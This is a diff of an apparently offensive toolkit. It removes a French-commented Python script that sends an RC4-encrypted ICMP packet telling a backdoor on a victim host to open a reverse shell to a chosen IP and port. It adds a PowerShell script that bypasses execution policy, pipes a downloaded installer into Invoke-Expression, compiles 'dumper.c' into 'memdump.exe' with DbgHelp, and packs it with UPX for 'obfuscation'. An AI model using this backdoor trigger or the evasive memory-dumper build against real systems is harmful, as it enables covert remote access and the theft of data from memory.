@@ -1,90 +1,130 @@
-#!/usr/bin/env python3
-"""
-attacker_trigger.py - Envoi d’un paquet ICMP déclencheur chiffré via RC4
+# Vérification et installation de Chocolatey
+function Install-Chocolatey {
+    if (-Not (Get-Command choco -ErrorAction SilentlyContinue)) {
+        Write-Host "[*] Chocolatey not found. Installing..."
+        Set-ExecutionPolicy Bypass -Scope Process -Force
+        Invoke-WebRequest -Uri "https://community.chocolatey.org/install.ps1" -UseBasicParsing | Invoke-Expression
+        Write-Host "[+] Chocolatey installed successfully."
+    } else {
+        Write-Host "[+] Chocolatey already installed."
+    }
+}
 
-Usage:
-    sudo ./attacker_trigger.py <target_ip> <reverse_ip> <reverse_port> [secret_key]
+# Vérification et installation de GCC via Chocolatey
+function Install-GCC {
+    if (-Not (Get-Command gcc -ErrorAction SilentlyContinue)) {
+        Write-Host "[*] GCC not found. Installing via Chocolatey..."
+        choco install mingw -y
+        Write-Host "[+] GCC installed successfully."
+    } else {
+        Write-Host "[+] GCC already installed."
+    }
+}
 
-Si secret_key n'est pas fourni, il utilise la valeur par défaut.
-"""
+# Vérification et installation de vcpkg
+function Install-Vcpkg {
+    $vcpkgRoot = "C:\vcpkg"
+    $vcpkgExe = "$vcpkgRoot\vcpkg.exe"
+    if (-Not (Test-Path $vcpkgExe)) {
+        Write-Host "[*] vcpkg not found. Installing..."
+        # Cloner le dépôt vcpkg dans C:\vcpkg
+        git clone https://github.com/Microsoft/vcpkg.git $vcpkgRoot
+        if ($LASTEXITCODE -ne 0) {
+            Write-Host "[!] Failed to clone vcpkg repository."
+            exit 1
+        }
+        Push-Location $vcpkgRoot
+        .\bootstrap-vcpkg.bat
+        if ($LASTEXITCODE -ne 0) {
+            Write-Host "[!] vcpkg bootstrap failed."
+            Pop-Location
+            exit 1
+        }
+        Pop-Location
+        Write-Host "[+] vcpkg installed successfully."
+    } else {
+        Write-Host "[+] vcpkg already installed."
+    }
+}
 
-import socket
-import struct
-import sys
-import os
+# Installation de zlib via vcpkg en configurant l'environnement pour MinGW
+function Install-Zlib {
+    $vcpkgRoot = "C:\vcpkg"
+    $vcpkgExe = "$vcpkgRoot\vcpkg.exe"
+    # Choix du triplet pour MinGW
+    $triplet = "x64-mingw-dynamic"
+    Write-Host "[*] Installing zlib via vcpkg using triplet $triplet..."
+    
+    # Définir les variables d'environnement pour utiliser le toolchain MinGW
+    $env:VCPKG_DEFAULT_TRIPLET = $triplet
+    $env:VCPKG_CHAINLOAD_TOOLCHAIN_FILE = "$vcpkgRoot\scripts\buildsystems\mingw.cmake"
+    
+    & $vcpkgExe install zlib:$triplet
+    if ($LASTEXITCODE -ne 0) {
+        Write-Host "[!] zlib installation via vcpkg failed."
+        exit 1
+    }
+    Write-Host "[+] zlib installed successfully via vcpkg."
+}
 
-ICMP_ECHO_REQUEST = 8
-DEFAULT_SECRET_KEY = "wA@2mC!dq"  # Doit correspondre à SECRET_KEY dans victim_backdoor.c
+# Vérification et installation de UPX
+function Install-UPX {
+    if (-Not (Test-Path "C:\UPX\upx.exe")) {
+        Write-Host "[*] UPX not found. Downloading..."
+        Invoke-WebRequest -Uri "https://github.com/upx/upx/releases/download/v5.0.0/upx-5.0.0-win64.zip" -OutFile "upx-5.0.0-win64.zip"
+        Expand-Archive -Path "upx-5.0.0-win64.zip" -DestinationPath "C:\UPX" -Force
+        Remove-Item "upx-5.0.0-win64.zip"
+        Write-Host "[+] UPX installed successfully."
+    } else {
+        Write-Host "[+] UPX already installed."
+    }
+}
 
-def rc4(data: bytes, key: bytes) -> bytes:
-    """Implémente RC4 pour chiffrer ou déchiffrer les données."""
-    S = list(range(256))
-    j = 0
-    out = bytearray()
-    for i in range(256):
-        j = (j + S[i] + key[i % len(key)]) % 256
-        S[i], S[j] = S[j], S[i]
-    i = 0
-    j = 0
-    for byte in data:
-        i = (i + 1) % 256
-        j = (j + S[i]) % 256
-        S[i], S[j] = S[j], S[i]
-        out.append(byte ^ S[(S[i] + S[j]) % 256])
-    return bytes(out)
+# Compilation du programme C avec GCC en utilisant zlib installé via vcpkg
+function Compile-CProgram {
+    $sourceFile = "dumper.c"
+    $executable = "memdump.exe"
 
-def checksum(source_bytes: bytes) -> int:
-    """Calcule le checksum pour le paquet ICMP."""
-    count_to = (len(source_bytes) // 2) * 2
-    s = 0
-    for count in range(0, count_to, 2):
-        this_val = source_bytes[count+1] * 256 + source_bytes[count]
-        s += this_val
-        s &= 0xffffffff
-    if count_to < len(source_bytes):
-        s += source_bytes[-1]
-        s &= 0xffffffff
-    s = (s >> 16) + (s & 0xffff)
-    s += (s >> 16)
-    answer = ~s & 0xffff
-    return socket.htons(answer)
+    if (-Not (Get-Command gcc -ErrorAction SilentlyContinue)) {
+        Write-Host "[!] GCC not found. Make sure MinGW is installed."
+        exit 1
+    }
 
-def create_icmp_packet(secret_key: str, reverse_ip: str, reverse_port: str) -> bytes:
-    """Construit un paquet ICMP contenant le payload déclencheur chiffré par RC4."""
-    packet_id = os.getpid() & 0xFFFF
-    packet_seq = 1
-    payload_str = f"{secret_key} {reverse_ip} {reverse_port}"
-    payload = payload_str.encode()
-    encrypted_payload = rc4(payload, secret_key.encode())
-    header = struct.pack("!BBHHH", ICMP_ECHO_REQUEST, 0, 0, packet_id, packet_seq)
-    packet = header + encrypted_payload
-    chksum = checksum(packet)
-    header = struct.pack("!BBHHH", ICMP_ECHO_REQUEST, 0, chksum, packet_id, packet_seq)
-    return header + encrypted_payload
+    Write-Host "[*] Compiling C program..."
+    # Chemins d'inclusion et de librairie depuis vcpkg
+    $vcpkgRoot = "C:\vcpkg"
+    $triplet = "x64-mingw-dynamic"
+    $zlibInclude = "$vcpkgRoot\installed\$triplet\include"
+    $zlibLib = "$vcpkgRoot\installed\$triplet\lib"
 
-def send_icmp_packet(target_ip: str, packet: bytes):
-    """Envoie le paquet ICMP via un socket RAW."""
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-    except PermissionError:
-        print("Ce script doit être exécuté en tant qu'administrateur/root.")
-        sys.exit(1)
-    sock.sendto(packet, (target_ip, 1))
-    sock.close()
-    print(f"[+] Paquet ICMP envoyé vers {target_ip}")
+    gcc -I"$zlibInclude" -L"$zlibLib" -o $executable $sourceFile -lz -lws2_32 -lDbgHelp
+    if ($LASTEXITCODE -ne 0) {
+        Write-Host "[!] Compilation failed."
+        exit 1
+    } else {
+        Write-Host "[+] Compilation successful: $executable"
+    }
+}
 
-def usage():
-    print(f"Usage: {sys.argv[0]} <target_ip> <reverse_ip> <reverse_port> [secret_key]")
-    sys.exit(1)
+# Obfuscation de l'exécutable avec UPX
+function Obfuscate-Executable {
+    $exePath = "memdump.exe"
+    if (Test-Path "C:\UPX\upx.exe") {
+        Write-Host "[*] Obfuscating executable with UPX..."
+        Start-Process -FilePath "C:\UPX\upx.exe" -ArgumentList "--best $exePath" -Wait
+        Write-Host "[+] Obfuscation completed."
+    } else {
+        Write-Host "[!] UPX not found. Skipping obfuscation."
+    }
+}
 
-if __name__ == "__main__":
-    if len(sys.argv) < 4:
-        usage()
+# Lancement des fonctions
+Install-Chocolatey
+Install-GCC
+Install-Vcpkg
+Install-Zlib
+Install-UPX
+Compile-CProgram
+Obfuscate-Executable
 
-    target_ip = sys.argv[1]
-    reverse_ip = sys.argv[2]
-    reverse_port = sys.argv[3]
-    secret_key = sys.argv[4] if len(sys.argv) >= 5 else DEFAULT_SECRET_KEY
-
-    packet = create_icmp_packet(secret_key, reverse_ip, reverse_port)
-    send_icmp_packet(target_ip, packet)
+Write-Host "[+] Operation Complete"
